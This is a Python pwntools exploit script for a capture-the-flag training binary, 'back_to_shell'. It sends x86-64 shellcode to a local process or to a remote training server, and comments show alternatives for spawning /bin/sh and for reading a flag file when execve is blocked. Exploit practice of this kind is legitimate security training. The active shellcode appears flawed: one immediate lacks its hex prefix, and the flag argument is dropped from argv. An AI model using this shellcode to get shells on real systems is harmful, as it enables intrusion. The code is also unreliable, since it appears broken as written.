from pwn import *

# asks for a string and executes it
# no constraints nor strange things, just basic stuff

# the * before the address means to gdb "address" (duh) instead of "symbol" (like the main function)
COMMANDS = """
b  *0x000000000040116e
c
"""
context.arch = "amd64"

if args.REMOTE:
    c = remote("back-to-shell.training.offensivedefensive.it", 8080, ssl=True)
else:
    if args.GDB:
        c = gdb.debug("./back_to_shell", gdbscript = COMMANDS)
    else:
        c = process("./back_to_shell")
        # gdb.attach(c,"""
        #             c
        #             """)

# input("Wait")
c.recvuntil(b"Shellcode: ")     # == wait until receiving "Shellcode: "

# if execve can be called (0x0068732f6e69622f is b"/bin/sh\0"[::-1].hex())
# shellcode = """
# xor eax, eax
# mov rax, 0x3b
# mov rdi, 0x0068732f6e69622f
# push rdi
# mov rdi, rsp
# syscall
# """

# if execve is blocked, we can only use read, write and open syscalls
# shellcode = """
# mov rdx, 0x0067616c66
# mov rax, 2
# push rdx
# mov rdi, rsp
# xor rdx, rdx
# syscall
# mov rdi, rax
# xor eax, eax
# mov rdx, 20
# mov rsi, rsp
# syscall
# mov rax, 1
# mov rdi, 1
# syscall
# """

# pwntools to write general shellcode, not specific to a real challenge
# c.send(asm(shellcraft.sh()))

# call /bin/cat flag with execve
shellcode = """
xor rdi, rdi
push rdi
mov rdi, 7461632f6e69622f
push rdi
mov rdi, rsp
mov rsi, 0x0067616c66
push rsi
mov rsi, rsp
xor rdx, rdx
push rdx
push rdi
mov rsi, rsp
mov rax, 0x3b
syscall
"""

shellcode_c = asm(shellcode)
c.send(shellcode_c)

# c.send(b"\x48\x89\xC7\x48\x83\xC7\x13\x48\x31\xC0\x48\xC7\xC0\x3B\x00\x00\x00\x0F\x05/bin/sh\0")
# c.sendline(b"\x48\x89\xC7\x48\x83\xC7\x13\x48\x31\xC0\x48\xC7\xC0\x3B\x00\x00\x00\x0F\x05/bin/sh\0")    # appends \n
c.interactive()